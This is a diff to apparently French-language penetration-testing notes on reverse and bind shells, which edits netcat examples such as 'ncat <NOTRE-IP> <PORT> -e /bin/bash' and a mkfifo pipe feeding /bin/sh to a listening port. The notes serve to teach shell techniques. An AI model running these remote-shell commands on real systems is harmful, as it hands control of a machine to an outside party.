@@ -50,7 +50,7 @@ Listening on 0.0.0.0 443
 Machine cible
 
 ```shell
-user@raspberrypi: ~$ ncat 192.168.1.100 443 -e /bin/bash
+user@raspberrypi: ~$ ncat <NOTRE-IP> <PORT> -e /bin/bash
 ```
 ou
 ```shell
@@ -84,6 +84,8 @@ Videos
 
 Un **blind shell** est ce qui se produit quand une cible va **démarrer un listener** attaché à un shell. Ce **port** est alors **ouvert** et on peut s'y connecter et obtenir l'execution du shell. L'avantage est qu'**on a aucune configuration à faire sur notre réseau** mais il peut être **empeché par des firewalls**.
 
+#### 1- Lancement du serveur netcat
+
 Machine cible
 
 ```shell
@@ -98,7 +100,9 @@ ou
 ```shell
 user@raspberrypi:~$ mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f
 ```
-**Lancement du serveur netcat**.
+si ncat ne prends pas `-e`
+
+#### 2- **Connection au port
 
 Notre machine
 
@@ -120,7 +124,6 @@ Templates
 Videos
 
 ```
-**Connection au port**.
 
 ### Interactive shell
 
